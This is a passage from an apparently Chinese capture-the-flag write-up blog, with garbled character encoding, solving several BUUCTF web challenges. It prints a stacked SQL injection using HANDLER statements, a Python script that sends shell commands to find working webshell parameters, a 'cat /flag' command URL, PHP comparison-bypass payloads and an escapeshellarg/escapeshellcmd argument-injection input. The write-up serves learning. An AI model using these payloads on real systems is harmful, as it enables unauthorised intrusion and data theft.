</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110717.png loading=lazy></p><hr><h1 id=gyctf2020blacklist>[GYCTF2020]Blacklist</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110821.png loading=lazy></p><p>sqlæ³¨å…¥ï¼Œå…ˆè¯•ä¸€è¯•å †å æ³¨å…¥ï¼Œå¯ä»¥æ‰§è¡Œï¼Œå°è¯•selectçš„æ—¶å€™è¿”å›äº†è¿‡æ»¤å†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;</span><span class=p>,</span><span class=nv>$inject</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>å‰é¢è¿˜æœ‰ä¸€ä¸ªå †å æ³¨å…¥çš„æ˜¯æ–°å§¿åŠ¿**[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨**ï¼Œä¸€ç§æ˜¯ä½¿ç”¨prepareé¢„å¤„ç†è¯­å¥ï¼Œå¦ä¸€ç§æ˜¯ä¿®æ”¹è¡¨åï¼Œæ ¹æ®ä¸Šé¢çš„è¿‡æ»¤å†…å®¹ï¼Œä¸¤ç§æ–¹æ³•éƒ½è¢«è¿‡æ»¤äº†ã€‚å…ˆè¯•è¯•æŸ¥çœ‹è¡¨ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;show tables;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>FlagHere
</span></span></span><span class=line><span class=cl><span class=s1>words
</span></span></span></code></pre></td></tr></table></div></div><p>æŸ¥çœ‹è¡¨ç»“æ„ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;desc `FlagHere`;
</span></span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥æ˜¯çœ‹çš„wpï¼Œå­¦åˆ°äº†ä¸ªæ–°å§¿åŠ¿ï¼šä½¿ç”¨<code>HANDLER ... OPEN</code>è¯­å¥ï¼Œè´´ä¸€ä¸ª<a class=link href=https://dev.mysql.com/doc/refman/8.0/en/handler.html target=_blank rel=noopener>å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><p><code>HANDLER ... OPEN</code>è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­<code>HANDLER ... READ</code>è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨<code>HANDLER ... CLOSE</code>æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close
</span></span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308111414.png loading=lazy></p><hr><h1 id=å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308112326.png loading=lazy></p><p>ä¸‹è½½æºç ä»¥åä¸€å †ä¸å¯è¯»çš„æºç ï¼Œä½†æ˜¯é‡Œé¢æœ‰å¾ˆå¤šshellï¼Œçœ‹ä¸æ‡‚æ‰€ä»¥æ‰¾äº†wpï¼Œæ€è·¯å°±æ˜¯ç”¨è„šæœ¬åŒ¹é…æ–‡ä»¶ä¸­çš„shellï¼Œç„¶åä¼ å‚è¯•ä¸€è¯•æ¯ä¸€ä¸ªshellæ˜¯å¦èƒ½ç”¨ï¼ŒæŠ„è„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># codeing = utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span>  <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>adapters</span><span class=o>.</span><span class=n>DEFAULT_RETRIES</span> <span class=o>=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>keep_alive</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sem</span><span class=o>=</span><span class=n>threading</span><span class=o>.</span><span class=n>Semaphore</span><span class=p>(</span><span class=mi>30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;D:\DROPS\phpstudy_pro\WWW\ctf\src</span><span class=se>\\</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fileNames</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rrGET</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\$_GET\[\&#39;(\w+)\&#39;\]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rrPOST</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\$_POST\[\&#39;(\w+)\&#39;\]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>local_file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>fileName</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>sem</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=o>+</span><span class=n>fileName</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+]checking: </span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>fileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>#GET</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>rrGET</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>?</span><span class=si>%s</span><span class=s2>=</span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>fileName</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=s2>&#34;echo ~guobanghhh~&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;~guobanghhh~&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=n>fileName</span> <span class=o>+</span> <span class=s2>&#34;ä¸­çš„&#34;</span> <span class=o>+</span> <span class=n>i</span> <span class=o>+</span> <span class=s2>&#34;å¯ä»¥ç”¨ï¼ï¼ï¼&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>local_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>#POST</span>
</span></span><span class=line><span class=cl>        <span class=c1># for i in rrPOST.findall(content):</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     r = session.post(url+fileName,data={i:&#34;echo ~guobanghhh~&#34;})</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     if &#34;~guobanghhh~&#34; in r.text:</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         flag = fileName + &#34;ä¸­çš„&#34; + i + &#34;å¯ä»¥ç”¨ï¼ï¼ï¼&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         print(flag)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         local_file.write(flag)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>(</span><span class=s2>&#34;xk0SzyKwfzw.php&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>  <span class=c1># å¼€å§‹æ—¶é—´</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[start]ç¨‹åºå¼€å§‹:&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>start_time</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>thread_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>fileName</span> <span class=ow>in</span> <span class=n>fileNames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>run</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>fileName</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>        <span class=n>thread_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>thread_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>thread_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœå°±æ˜¯è®¿é—®</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
</span></span></code></pre></td></tr></table></div></div><p>è·å¾—flag</p><hr><h1 id=mrctf2020ez_bypass>[MRCTF2020]Ez_bypass</h1><p>ä¸æˆªå›¾äº†ï¼Œä¸»é¡µæ²¡æœ‰ä»£ç æ ¼å¼ï¼Œè´´ä¸€ä¸ªæºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>I</span> <span class=nx>put</span> <span class=nx>something</span> <span class=nx>in</span> <span class=nx>F12</span> <span class=k>for</span> <span class=nx>you</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$flag</span><span class=o>=</span><span class=s1>&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;gg&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$id</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$gg</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;gg&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$gg</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$id</span> <span class=o>!==</span> <span class=nv>$gg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;You got the first step&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$passwd</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$passwd</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                 <span class=k>if</span><span class=p>(</span><span class=nv>$passwd</span><span class=o>==</span><span class=mi>1234567</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                 <span class=p>{</span>
</span></span><span class=line><span class=cl>                     <span class=k>echo</span> <span class=s1>&#39;Good Job!&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                     <span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                     <span class=k>die</span><span class=p>(</span><span class=s1>&#39;By Retr_0&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                 <span class=p>}</span>
</span></span><span class=line><span class=cl>                 <span class=k>else</span>
</span></span><span class=line><span class=cl>                 <span class=p>{</span>
</span></span><span class=line><span class=cl>                     <span class=k>echo</span> <span class=s2>&#34;can you think twice??&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                 <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;You can not get it !&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;only one way to get the flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;You are not a real hacker!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Please input first&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=nx>Please</span> <span class=nx>input</span> <span class=nx>first</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ†æä¸€æ³¢ï¼š</p><ul><li>ç¬¬7è¡Œæ˜¯ç¬¬ä¸€å±‚éœ€è¦md5çš„å€¼ç›¸åŒä½†æ˜¯ä¸¤ä¸ªå˜é‡ä¸åŒï¼Œéœ€è¦æ³¨æ„æ˜¯å¼ºæ¯”è¾ƒ<code>===</code>å™¢ã€‚</li><li>ç¬¬11ã€17è¡Œåˆ¤æ–­passwdæ˜¯éæ•°å­—å¹¶ä¸”è‹¥æ¯”è¾ƒ<code>==</code>ç­‰äº1234567</li></ul><p>ç¬¬ä¸€ä¸ªåˆ©ç”¨æ•°ç»„å³å¯ç»•è¿‡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>md5([1,2,3]) == md5([4,5,6]) == NULL
</span></span></code></pre></td></tr></table></div></div><p>ç¬¬äºŒä¸ªåˆ©ç”¨æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œå­—ç¬¦ä¸²<code>1234567a</code>ä¼šè¢«å¼ºåˆ¶è½¬æ¢ç±»å‹ä¸ºæ•´å‹çš„<code>1234567</code></p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id[]=1&amp;gg[]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>passwd=1234567a
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=buuctf-2018online-tool>[BUUCTF 2018]Online Tool</h1><p>æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sandbox</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;glzjin&#34;</span><span class=o>.</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;you are in sandbox &#39;</span><span class=o>.</span><span class=nv>$sandbox</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$sandbox</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=nv>$sandbox</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span class=o>.</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€åæœ‰ä¸€ä¸ªsystemå‡½æ•°ï¼Œä½†æ˜¯ä½¿ç”¨çš„nmapçš„æŒ‡ä»¤ï¼Œç»è¿‡ä¸€ç•ªæœç´¢å¾—çŸ¥äº†nmapå¯ä»¥æŠŠç»“æœå­˜å‚¨åœ¨æ–‡ä»¶é‡Œï¼Œæ‰€ä»¥è¿™é“é¢˜ä¹Ÿæ˜¯é“RCEã€‚è¿˜æœ‰ä¸¤ä¸ªæ²¡è§è¿‡çš„å‡½æ•°<code>escapeshellarg</code>ã€<code>escapeshellcmd</code>ã€‚</p><p>è¿™é“é¢˜åˆ©ç”¨äº†ä¸¤ä¸ªç‚¹</p><ol><li><p>nmapå¯ä»¥å°†æ‰«æçš„ç»“æœå­˜å‚¨åœ¨æ–‡ä»¶é‡Œã€‚ä½¿ç”¨æ–¹æ³•ï¼š<a class=link href=https://blog.csdn.net/weixin_34221036/article/details/92148628 target=_blank rel=noopener>Nmapæ‰«æç»“æœçš„ä¿å­˜å’Œè¾“å‡º</a></p></li><li><p>escapeshellarg+escapeshellcmdåŒæ—¶ä½¿ç”¨æœ‰ä¸€äº›æ¼æ´</p><blockquote><p><a class=link href=http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/ target=_blank rel=noopener>è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜</a></p><p><a class=link href=https://paper.seebug.org/164/ target=_blank rel=noopener>PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p></blockquote></li></ol><p>å‚è€ƒåšå®¢æ•´ç†ä¸€ä¸‹è¿™ä¸¤ä¸ªå¤„ç†å‘½ä»¤çš„å‡½æ•°åŒæ—¶ä½¿ç”¨æ—¶çš„é—®é¢˜ï¼š</p><ol><li>å‡å¦‚ä¼ å…¥çš„å‚æ•°ä¸º<code>172.17.0.2' -v -d a=1</code></li><li>é¦–å…ˆç»è¿‡<code>escapeshellarg</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæŠŠå•ç‹¬çš„å•å¼•å·<code>'</code>åŠ ä¸Šè½¬ä¹‰ç¬¦<code>\</code>å¹¶ä½¿ç”¨å•å¼•å·<code>'</code>æ‹¬èµ·æ¥ï¼Œå†ä½¿ç”¨å•å¼•å·<code>'</code>æŠŠæ•´ä¸ªå‚æ•°æ‹¬èµ·æ¥ã€‚è¿™æ—¶å€™çš„å‚æ•°æ˜¯<code>'172.17.0.2'\'' -v -d a=1'</code></li><li>å†è¿›å…¥<code>escapeshellcmd</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ï¼ˆä»å·¦è‡³å³ä¼šæŠŠè½å•çš„ç¬¦å·ç›´æ¥åŠ 